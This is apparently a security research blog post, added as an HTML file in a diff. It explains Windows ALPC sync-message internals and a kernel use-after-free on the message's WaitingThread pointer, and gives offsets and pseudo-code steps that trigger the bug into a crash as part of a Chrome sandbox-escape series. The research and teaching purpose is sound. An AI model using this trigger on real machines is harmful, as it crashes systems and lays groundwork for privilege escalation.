@@ -1,0 +1,1597 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;Hi everyone! Today gongjae is back with Step 5 &amp;#x2014; the crown jewel of the Wipeload project, haha.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Previous research posts&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&#34;&gt;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&#34;&gt;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&#34;&gt;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&#34;&gt;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Steps 2&amp;#x2013;3 covered ji9umi&amp;#x2019;s Renderer RCE, and in Step 4 OUYA77 gave us a detailed tour of the Chrome sandbox. Picking up that Way from both of them, I&amp;#x2019;m going to walk you through &amp;#x2014; in detail &amp;#x2014; &lt;strong&gt;how do we actually get to Medium-privilege code execution from Chrome?&lt;/strong&gt; In today&amp;#x2019;s Step 5 I&amp;#x2019;ll explain ALPC, the key ingredient of the Sandbox Escape, and in Step 6 we&amp;#x2019;ll take that ALPC and see how it takes us all the way to Medium-privilege code execution!&lt;/p&gt;
+&lt;p&gt;Shall we get right into it? Let&amp;#x2019;s go~&lt;/p&gt;
+&lt;h1 id=&#34;1-Sorry-I-studied-ALPC-just-to-show-you-this&#34;&gt;&lt;a href=&#34;#1-Sorry-I-studied-ALPC-just-to-show-you-this&#34; class=&#34;headerlink&#34; title=&#34;1. Sorry, I studied ALPC just to show you this&#34;&gt;&lt;/a&gt;1. Sorry, I studied ALPC just to show you this&lt;/h1&gt;&lt;p&gt;ALPC (Advanced Local Procedure Call) is the IPC that sits at the very bottom of process-to-process conversations inside Windows. The local RPC we&amp;#x2019;re all familiar with, at the kernel level, mostly ends up riding ALPC too, and system services everyone has heard of like &amp;#x201C;csrss.exe&amp;#x201D; or &amp;#x201C;lsass.exe&amp;#x201D;, DCOM, WinRT activation&amp;#x2026; pretty much every user-mode service is talking over an ALPC port somewhere. Chrome is no exception &amp;#x2014; the Mojo IPC pipe between the renderer and the browser has ALPC partially baked into its underlying transport. Which is to say: the object we&amp;#x2019;re going to be poking at today is dead common, but the kind of thing you&amp;#x2019;d miss unless you look closely!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?? : You studied ALPC just to do THIS?&lt;br&gt;gongjae : &lt;del&gt;Nope, just did it for fun&lt;/del&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Inside the kernel, two objects star in this show. &lt;code&gt;_ALPC_PORT&lt;/code&gt; is the communication endpoint, and &lt;code&gt;KALPC_MESSAGE&lt;/code&gt; is a single message flowing through that endpoint. Easiest mental model: server opens a port, clients attach, they exchange messages!&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/&#34;&gt;https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Actually, we already went over ALPC once in a previous research post, right? Stuff like the port splitting into two tiers of connection port / communication port, and basic message-attribute concepts &amp;#x2014; I put all of that together in the earlier ALPC post! If this is your first time hearing about ALPC, I&amp;#x2019;d recommend giving that one a skim first&amp;#x2026; but honestly the single most important fact is: &lt;strong&gt;how does the Chrome sandbox treat ALPC?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image3.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The answer: the &lt;code&gt;NtAlpc*&lt;/code&gt; family of syscalls themselves are &lt;strong&gt;not&lt;/strong&gt; on the sandbox&amp;#x2019;s filter list!! Even though it&amp;#x2019;s an undocumented interface with nothing on the official docs, it&amp;#x2019;s a very-much-alive API, so even an Untrusted IL renderer can call the stubs &lt;code&gt;ntdll&lt;/code&gt; exports directly.&lt;/p&gt;
+&lt;h2 id=&#34;1-1-Sync-vs-Async&#34;&gt;&lt;a href=&#34;#1-1-Sync-vs-Async&#34; class=&#34;headerlink&#34; title=&#34;1.1 Sync vs Async&#34;&gt;&lt;/a&gt;1.1 Sync vs Async&lt;/h2&gt;&lt;p&gt;There are two ways to send a message over ALPC. &lt;strong&gt;Async&lt;/strong&gt; requests toss the request onto a queue and the calling thread goes on its merry way. &lt;strong&gt;Sync&lt;/strong&gt; requests, on the other hand, park the calling thread inside the kernel until an answer comes back!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image4.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;For the kernel to sustain that &amp;#x201C;parked&amp;#x201D; state, it obviously needs some info, right? Which thread is waiting on which message, who to wake up when the reply lands &amp;#x2014; that stuff has to be recorded somewhere!&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+Quick aside on why the two modes are asymmetric here: async requests don&amp;#x2019;t need the kernel to know &amp;#x201C;who&amp;#x2019;s waiting on this reply?&amp;#x201D; As long as the completion callback is correctly registered, we&amp;#x2019;re done. &amp;#x1FAE0;
+Sync is a different story though. The moment the reply arrives, the kernel code handling it has to figure out **&amp;#x201C;okay, I got this &amp;#x2014; who exactly am I supposed to wake up??&amp;#x201D;**, and that answer has to be pre-stored as a back-pointer somewhere.
+
+&lt;/aside&gt;
+
+&lt;h2 id=&#34;1-2-Waiting-thread&#34;&gt;&lt;a href=&#34;#1-2-Waiting-thread&#34; class=&#34;headerlink&#34; title=&#34;1.2 Waiting thread&#34;&gt;&lt;/a&gt;1.2 Waiting thread&lt;/h2&gt;&lt;p&gt;So when a sync request comes in, the kernel slips a back-pocket pointer into the message object that says &amp;#x201C;the thread waiting on this message&amp;#x2019;s reply is THIS guy!!&amp;#x201D; That&amp;#x2019;s the &lt;code&gt;_KALPC_MESSAGE.WaitingThread&lt;/code&gt; field, and in the environment I&amp;#x2019;m experimenting with today, Windows 22H2 22621.963, it lives at offset +0x20.&lt;/p&gt;
+&lt;p&gt;There&amp;#x2019;s a matching field going the other direction too. On the thread side there&amp;#x2019;s a field that records &amp;#x201C;the message I&amp;#x2019;m currently waiting on is THIS guy!!&amp;#x201D; &amp;#x2014; that&amp;#x2019;s &lt;code&gt;_ETHREAD.AlpcMessageId&lt;/code&gt;, located at offset +0x578. WaitingThread from earlier and this AlpcMessageId form a pair of back-pointers pointing at each other!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image5.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Kind of like how Tai Lung and Master Shifu shared a special bond back when Tai Lung was little&amp;#x2026;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There&amp;#x2019;s a reason the kernel bothers to write this pair with &lt;code&gt;_InterlockedExchange&lt;/code&gt; atomically&amp;#x2026; since the same thread can be touched from multiple places at once, you need atomicity to avoid races. &amp;#x1F602;&lt;/p&gt;
+&lt;p&gt;But even so &amp;#x2014; when the pair matches it&amp;#x2019;s beautiful, and the moment one side falls out of step, that&amp;#x2019;s when things go sideways. The main character of today&amp;#x2019;s vuln is this very field, and an unmanaged back-pointer is guaranteed to blow up in your face sooner or later, haha!&lt;/p&gt;
+&lt;h1 id=&#34;2-Root-Cause&#34;&gt;&lt;a href=&#34;#2-Root-Cause&#34; class=&#34;headerlink&#34; title=&#34;2. Root Cause&#34;&gt;&lt;/a&gt;2. Root Cause&lt;/h1&gt;&lt;p&gt;Alright, as I said above, we need to see why this unmanaged back-pointer is the seed of the vuln, right? But first, let&amp;#x2019;s quickly review sync vs async messaging through some code!&lt;/p&gt;
+&lt;h2 id=&#34;2-1-ALPC-MSGFLG-SYNC-REQUEST&#34;&gt;&lt;a href=&#34;#2-1-ALPC-MSGFLG-SYNC-REQUEST&#34; class=&#34;headerlink&#34; title=&#34;2.1 ALPC_MSGFLG_SYNC_REQUEST&#34;&gt;&lt;/a&gt;2.1 ALPC_MSGFLG_SYNC_REQUEST&lt;/h2&gt;&lt;p&gt;The entry point where a message actually lands on the queue is &lt;code&gt;AlpcpDispatchNewMessage&lt;/code&gt;. That &amp;#x201C;somewhere in the middle&amp;#x201D; I mentioned earlier is right here! Looking at it in IDA it feels like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((SendFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {          &lt;span class=&#34;hljs-comment&#34;&gt;// ALPC_MSGFLG_SYNC_REQUEST&lt;/span&gt;
+    &lt;span class=&#34;hljs-comment&#34;&gt;// plant the thread back-pointer&lt;/span&gt;
+    *(_QWORD *)(msg + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;) = curthread;                 &lt;span class=&#34;hljs-comment&#34;&gt;// msg.WaitingThread = current _ETHREAD&lt;/span&gt;
+    _InterlockedExchange64(curthread + &lt;span class=&#34;hljs-number&#34;&gt;0x578&lt;/span&gt;, msg);      &lt;span class=&#34;hljs-comment&#34;&gt;// _ETHREAD.AlpcMessageId = msg&lt;/span&gt;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Two lines, that&amp;#x2019;s the whole trick. Stuff the current thread&amp;#x2019;s &lt;code&gt;_ETHREAD&lt;/code&gt; directly into &lt;code&gt;msg+0x20&lt;/code&gt;, and conversely plant the message at &lt;code&gt;curthread + 0x578&lt;/code&gt;. That completes the pair of back-pointers pointing at each other.&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s also briefly trace how SendFlags gets here.&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+When user code calls `NtAlpcSendWaitReceivePort`, the kernel enters `AlpcpSendMessage`, decides routing, and then hands off to this `AlpcpDispatchNewMessage`. The trigger I&amp;#x2019;m using today goes through `NtWaitForWorkViaWorkerFactory`, but even there &amp;#x2014; the moment it processes a deferred send &amp;#x2014; we end up at that same dispatch site.
+&amp;#x2192; Bottom line: no matter which road you take, if `SendFlags &amp;amp; 0x20000` is satisfied, those two lines run!!
+
+&lt;/aside&gt;
+
+&lt;p&gt;&lt;code&gt;SendFlags &amp;amp; 0x20000&lt;/code&gt; is checking the &lt;code&gt;ALPC_MSGFLG_SYNC_REQUEST&lt;/code&gt; flag &amp;#x2014; if it were an async request, those two lines get skipped wholesale, right? So to hit this vuln you absolutely have to set 0x20000 in SendFlags and take the sync-request branch. The original Theori blog really emphasized this too!!&lt;/p&gt;
+&lt;p&gt;One more thing worth noting: the reason the setting is stamped in both directions is to leave no gaps when routing the reply. But this pair hides a fun little asymmetry &amp;#x2014; would you believe me???&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image6.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;When the thread dies, the &lt;code&gt;_ETHREAD&lt;/code&gt; gets deleted entirely, so the &lt;code&gt;AlpcMessageId&lt;/code&gt; on the other side also disappears with it&lt;/li&gt;
+&lt;li&gt;But the WaitingThread planted on the message side stays right there as long as the message is alive&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This asymmetry is exactly the starting point of the vulnerability!&lt;/p&gt;
+&lt;h2 id=&#34;2-2-SYNC-REQUEST-Use-After-Free&#34;&gt;&lt;a href=&#34;#2-2-SYNC-REQUEST-Use-After-Free&#34; class=&#34;headerlink&#34; title=&#34;2-2. SYNC_REQUEST Use-After-Free&#34;&gt;&lt;/a&gt;2-2. SYNC_REQUEST Use-After-Free&lt;/h2&gt;&lt;p&gt;This back-pointer pair has no concept of lifetime management. It gets &lt;em&gt;set&lt;/em&gt;, but there&amp;#x2019;s no janitor to clean up the WaitingThread inside the message when the thread dies!! &amp;#x1F9F9; That is, no exaggeration, the root of today&amp;#x2019;s vuln.&lt;/p&gt;
+&lt;p&gt;Layering a reference-counting lens on top makes it click. In the Windows kernel, the by-the-book way to store an object pointer inside another object is: bump the refcount with &lt;code&gt;ObReferenceObjectByPointer&lt;/code&gt;, and when you&amp;#x2019;re done, drop it back down with the matching dereference.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image7.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&amp;#x2192; But WaitingThread?? It just plants a raw pointer, that&amp;#x2019;s it!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;It doesn&amp;#x2019;t touch the &lt;code&gt;_ETHREAD&lt;/code&gt; refcount, and it doesn&amp;#x2019;t clean up this slot on destruction&amp;#x2026; &amp;#x1F975;&lt;/p&gt;
+&lt;p&gt;The consequence: even after the thread dies, its refcount hits 0, and it gets returned to the pool slab &amp;#x2014; this raw pointer just sits there, unbothered!! That opens up the following scenario.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image8.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Some thread sends a SYNC message and plants itself into msg+0x20&lt;/li&gt;
+&lt;li&gt;That thread dies via &lt;code&gt;NtTerminateThread&lt;/code&gt;, and via &lt;code&gt;CloseHandle(hThread)&lt;/code&gt; and &lt;code&gt;CloseHandle(hWorkerFactory)&lt;/code&gt; the &lt;code&gt;_ETHREAD&lt;/code&gt; gets returned to the &lt;code&gt;NonPagedPoolNx&lt;/code&gt; Thre-tag slab&lt;/li&gt;
+&lt;li&gt;Because the worker factory is holding one reference on the thread, just closing the thread handle isn&amp;#x2019;t enough to release the slab&lt;/li&gt;
+&lt;li&gt;Result: the WaitingThread inside the message keeps pointing at what is now a pointer that will get freed!!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Sounds like OUYA77&amp;#x2019;s feather-for-Tai-Lung from Step 4 is now sitting on the table, doesn&amp;#x2019;t it? Right now it looks like a totally useless feather, but the moment the kernel touches this message again and dereferences msg+0x20 &amp;#x2014; boom, UAF.&lt;/p&gt;
+&lt;h2 id=&#34;2-3-How-to-Trigger-UAF&#34;&gt;&lt;a href=&#34;#2-3-How-to-Trigger-UAF&#34; class=&#34;headerlink&#34; title=&#34;2.3 How to Trigger UAF?&#34;&gt;&lt;/a&gt;2.3 How to Trigger UAF?&lt;/h2&gt;&lt;p&gt;Okay, now let&amp;#x2019;s look at how you actually &lt;strong&gt;fire&lt;/strong&gt; this unmanaged back-pointer! The trigger is split across two threads. One is the &lt;strong&gt;trigger thread&lt;/strong&gt;, which queues the message, plants itself, then falls asleep inside the kernel. The other is the &lt;strong&gt;main thread&lt;/strong&gt;, which kills the trigger thread and, at the very end, lights the fuse!&lt;/p&gt;
+&lt;p&gt;But here&amp;#x2019;s a new object we haven&amp;#x2019;t met: &lt;strong&gt;WorkerFactory&lt;/strong&gt;. It&amp;#x2019;s a kernel object that arrived in Vista as the backend of the Windows thread pool, playing housekeeper &amp;#x2014; creating, maintaining, and reclaiming its own worker threads.&lt;/p&gt;
+&lt;p&gt;Normally a worker thread&amp;#x2019;s life in the Windows thread pool is dead simple. It calls &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt; and dozes inside the kernel until there&amp;#x2019;s a work item to handle; when work shows up it wakes up, does the job, and goes back to sleep via this syscall. So this syscall is the thread pool&amp;#x2019;s &lt;strong&gt;&amp;#x201C;worker, wait here until there&amp;#x2019;s work&amp;#x201D;&lt;/strong&gt; parking spot.&lt;/p&gt;
+&lt;p&gt;But we have zero interest in actually running a thread pool. We just create a bare-shell WorkerFactory with &lt;code&gt;NtCreateWorkerFactory&lt;/code&gt; and then, pretending to be a worker, we call &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt; ourselves to &lt;strong&gt;hitch a ride on that &amp;#x201C;worker-waiting-for-work&amp;#x201D; mechanism&lt;/strong&gt;.&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+But why build the trigger on *this specific* syscall? There&amp;#x2019;s a reason!
+`NtWaitForWorkViaWorkerFactory` takes as its last argument an undocumented struct called `WORKER_FACTORY_DEFERRED_WORK` (WFDW for short), which the kernel consumes inside &amp;#x2014; and one of its fields is `AlpcSendMessageFlags`. Which means user code can just jam 0x20000 in there directly&amp;#x2026;!
+&amp;#x2192; In other words, &amp;#x201C;hey kernel, please queue a SYNC-natured ALPC message on my behalf!!&amp;#x201D; &amp;#x2014; a back door is sitting wide open right here. &amp;#x1F60E;
+
+&lt;/aside&gt;
+
+&lt;p&gt;Setting &lt;code&gt;WFDW.Flags&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; to go into &lt;strong&gt;deferred send&lt;/strong&gt; mode is also a key point. If you go immediate-send, right after the message is queued it flows straight through to dispatch completion, and the moment you set things up, the other side&amp;#x2019;s cleanup gets dragged along too. Switching to deferred send and kicking it off with &lt;code&gt;NtSetIoCompletion&lt;/code&gt; lets us &lt;strong&gt;plant the setup but defer the dispatch completion&lt;/strong&gt;. That&amp;#x2019;s the window we need to create the dangling state!&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s look at the steps the trigger thread walks through. One thing to note up front &amp;#x2014; steps 1, 2, 3 build the &amp;#x201C;ingredients (handles)&amp;#x201D; IoCompletion / WorkerFactory / ALPC port, and 4, 5, 6 are all just &lt;strong&gt;&amp;#x201C;fill in values in my user memory&amp;#x201D;&lt;/strong&gt; prep work. The message actually landing on the queue and this thread getting nailed to the kernel &amp;#x2014; that happens on line 7, and only line 7. Until 7, the message, the trailer, and the WFDW are just struct values being set in user memory; the moment that bundle crosses into the kernel and becomes &amp;#x201C;message queued + thread blocked&amp;#x201D; is precisely 7.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2500;&amp;#x2500; 1,2,3 : create kernel handles (ingredients) first &amp;#x2500;&amp;#x2500;&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;1.&lt;/span&gt; NtCreateIoCompletion(&amp;amp;hIoComp, ...)                       &lt;span class=&#34;hljs-comment&#34;&gt;// IoCompletion handle&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;2.&lt;/span&gt; NtCreateWorkerFactory(&amp;amp;hWF, ..., hIoComp,                 &lt;span class=&#34;hljs-comment&#34;&gt;// WorkerFactory shell&lt;/span&gt;
+                         GetCurrentProcess(), ...)
+&lt;span class=&#34;hljs-number&#34;&gt;3.&lt;/span&gt; NtAlpcCreatePort(&amp;amp;hPort, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;attr)                     &lt;span class=&#34;hljs-comment&#34;&gt;// anonymous ALPC port (Flags = 0x20000)&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2500;&amp;#x2500; 4,5,6 : from here it&amp;apos;s all just filling struct values in &amp;apos;user memory&amp;apos; (kernel doesn&amp;apos;t know yet) &amp;#x2500;&amp;#x2500;&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;4.&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;Prepare &lt;span class=&#34;hljs-title&#34;&gt;PORT_MESSAGE&lt;/span&gt;  &lt;span class=&#34;hljs-params&#34;&gt;(user memory)&lt;/span&gt;                         &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; the &amp;apos;message&amp;apos; itself&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;     DataLength     &lt;/span&gt;= &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;
+     TotalLength    = &lt;span class=&#34;hljs-number&#34;&gt;0x128&lt;/span&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 0x28 header + 0x100 body&lt;/span&gt;
+     DataInfoOffset = &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;         &lt;span class=&#34;hljs-comment&#34;&gt;// signpost: &amp;quot;my trailer is over here&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-number&#34;&gt;5.&lt;/span&gt; Set up the trailer  (msg + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;, user memory)               &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; the spot DataInfoOffset points to&lt;/span&gt;
+     NumberOfEntries        = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
+     Entries[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;].BaseAddress = target_page   &lt;span class=&#34;hljs-comment&#34;&gt;// an RW page in my process&lt;/span&gt;
+     Entries[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;].DataLength  = &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;
+
+&lt;span class=&#34;hljs-number&#34;&gt;6.&lt;/span&gt; Set up WFDW  (user memory)                                  &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; the &amp;quot;order form&amp;quot; we&amp;apos;ll hand to the kernel&lt;/span&gt;
+     .AlpcSendMessage      = &amp;amp;msg
+     .AlpcSendMessagePort  = hPort
+     .AlpcSendMessageFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// SYNC_REQUEST&lt;/span&gt;
+     .Flags                = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;hljs-comment&#34;&gt;// deferred send&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2500;&amp;#x2500; from here we enter the kernel: we hand the whole WFDW over &amp;#x2500;&amp;#x2500;&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;7.&lt;/span&gt; NtWaitForWorkViaWorkerFactory(hWF, ..., &amp;amp;wfdw)
+   &lt;span class=&#34;hljs-comment&#34;&gt;// kernel reads WFDW, performs deferred SYNC send &amp;#x2192; message queued +&lt;/span&gt;
+   &lt;span class=&#34;hljs-comment&#34;&gt;//   msg.WaitingThread = my _ETHREAD planted + this thread blocks!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image9.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Putting it in words again: setting up the message (4), trailer (5), and WFDW (6) is all just writing values into my user memory. &lt;code&gt;PORT_MESSAGE&lt;/code&gt;&amp;#x2019;s &lt;code&gt;DataInfoOffset = 0x30&lt;/code&gt; is a signpost saying &amp;#x201C;my trailer is 0x30 bytes into msg,&amp;#x201D; and 5 is writing &lt;code&gt;BaseAddress&lt;/code&gt; / &lt;code&gt;DataLength&lt;/code&gt; at that spot. The kernel has zero idea what we&amp;#x2019;re preparing up to this point. The actual &amp;#x201C;send message (post)&amp;#x201D; isn&amp;#x2019;t a send function we call ourselves &amp;#x2014; it&amp;#x2019;s the kernel doing it &lt;em&gt;on our behalf&lt;/em&gt; when we hand the WFDW we filled at 6 over via &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt; at 7. That&amp;#x2019;s when it takes the SYNC branch and plants my &lt;code&gt;_ETHREAD&lt;/code&gt; into &lt;code&gt;msg.WaitingThread&lt;/code&gt;. But because we&amp;#x2019;re in deferred mode, the setup is planted but the follow-up cleanup gets pushed back &amp;#x2014; and &lt;em&gt;that gap&lt;/em&gt; is exactly the time window we need in the next step to create the dangling state.&lt;/p&gt;
+&lt;p&gt;By the time we get here, the kernel state looks like this: the message is sitting on the port queue, that message&amp;#x2019;s &lt;code&gt;+0x20&lt;/code&gt; points at the trigger thread&amp;#x2019;s &lt;code&gt;_ETHREAD&lt;/code&gt;, and the trigger thread is snoozing away inside &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;. The deal is sealed, and our target is nailed firmly to its seat!&lt;/p&gt;
+&lt;p&gt;Now it&amp;#x2019;s the main thread&amp;#x2019;s turn to light the fuse!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;A. CreateThread(trigger)
+B. NtSetIoCompletion(hIoComp, ...)   &lt;span class=&#34;hljs-comment&#34;&gt;// kick off the deferred send&lt;/span&gt;
+C. Sleep(&lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;)                        &lt;span class=&#34;hljs-comment&#34;&gt;// wait for the trigger thread to settle&lt;/span&gt;
+D. NtTerminateThread(hthread, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)     &lt;span class=&#34;hljs-comment&#34;&gt;// kill it WITHOUT WFSO!!&lt;/span&gt;
+E. CloseHandle(hthread)              &lt;span class=&#34;hljs-comment&#34;&gt;// thread-handle ref -1&lt;/span&gt;
+   Sleep(&lt;span class=&#34;hljs-number&#34;&gt;40000&lt;/span&gt;)                      &lt;span class=&#34;hljs-comment&#34;&gt;// slot we&amp;apos;ll use in Step 6 &amp;#x2014; today it&amp;apos;s just wait time&lt;/span&gt;
+F. CloseHandle(hWorkerFactory)       &lt;span class=&#34;hljs-comment&#34;&gt;// only after this does the _ETHREAD return to the slab&lt;/span&gt;
+G. CloseHandle(hIoComp)
+H. CloseHandle(hPort)                &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; boom!!!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image10.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+Look at D &amp;#x2014; we do **not** wait for the thread to finish with `WaitForSingleObject`, we just force-kill it with `NtTerminateThread`. Normally you&amp;#x2019;d throw a WFSO in there, and *not doing that* is the point! If you wait for total destruction via WFSO, the follow-on cleanup path grabs one more kernel reference and the dangling state we want doesn&amp;#x2019;t form. So we just kill it and close handles, shaving off exactly one reference at a time.
+
+&lt;/aside&gt;
+
+&lt;p&gt;Then the big moment &amp;#x2014; H, &lt;code&gt;CloseHandle(hPort)&lt;/code&gt; &amp;#x2014; that&amp;#x2019;s what sets off the bomb. The &lt;code&gt;Close(hWF)&lt;/code&gt; and &lt;code&gt;Close(hIoComp)&lt;/code&gt; before it do absolutely nothing! The call chain looks like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;NtClose(hPort)
+ &amp;#x2192; AlpcpClosePort &amp;#x2192; AlpcpDeletePort
+ &amp;#x2192; AlpcpSendCloseMessage + AlpcpDoPortCleanup
+ &amp;#x2192; AlpcpFlushMessagesPort &amp;#x2192; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;&amp;#xD7; AlpcpFlushQueue
+ &amp;#x2192; AlpcpCancelMessage +&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;
+     rcx = *(msg + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;);        &lt;span class=&#34;hljs-comment&#34;&gt;// msg.WaitingThread (already-freed _ETHREAD!)&lt;/span&gt;
+     xchg [rcx + &lt;span class=&#34;hljs-number&#34;&gt;0x578&lt;/span&gt;], rax     &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; UAF write here &amp;#x2192; BSOD&lt;/span&gt;
+     &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2192; PAGE_FAULT_IN_NONPAGED_AREA (0x50)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
